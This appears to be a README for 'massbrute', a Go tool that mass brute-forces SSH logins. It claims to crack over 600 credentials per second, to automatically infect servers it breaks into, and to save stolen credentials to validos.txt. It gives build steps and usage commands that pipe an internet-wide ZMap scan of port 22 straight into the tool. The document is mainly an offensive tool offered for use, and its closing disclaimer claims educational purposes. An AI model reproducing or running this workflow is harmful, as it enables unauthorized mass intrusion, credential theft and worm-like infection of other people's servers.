massbrute

Massive SSH bruteforcer written in Go.
This tool is designed for high-speed brute-forcing of SSH servers and is capable of cracking over 600 credentials per second. Upon successful authentication, it automatically infects the server and logs the credentials to a file.

⚠️ Warning: This tool is extremely aggressive and is intended to be run on dedicated machines only. Use responsibly and only in environments where you have explicit authorization.
📦 Features

    Bruteforces thousands of SSH servers per second

    Infects compromised servers automatically

    Saves valid credentials to validos.txt in the format:

    ip:username:password

    Reads targets from stdin (supports real-time feeds)

🛠 Installation
1. Install Go (Tested with Go 1.21.3)

wget https://dl.google.com/go/go1.21.3.linux-amd64.tar.gz
tar -xvf go1.21.3.linux-amd64.tar.gz
sudo mv go /usr/local

2. Configure Environment

export GOROOT=/usr/local/go

export GOPATH=$HOME/go

export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

source ~/.profile

3. Build the Binary

go get golang.org/x/crypto/ssh
go build massbrute.go

⚙️ Usage
Using live IP feed from ZMap:

zmap -p 22 -r 0 -T 10 | ./massbrute

Using static IP list:

cat iplist.txt | ./massbrute

🧪 Performance

    🔥 Cracks 600+ credentials per second

    💾 Stores results in validos.txt with this format:

    192.168.0.1:root:toor

🛑 Legal Disclaimer

This tool is provided for educational and authorized testing purposes only.
Any misuse or unauthorized access to systems is strictly prohibited and illegal.
Use at your own risk.
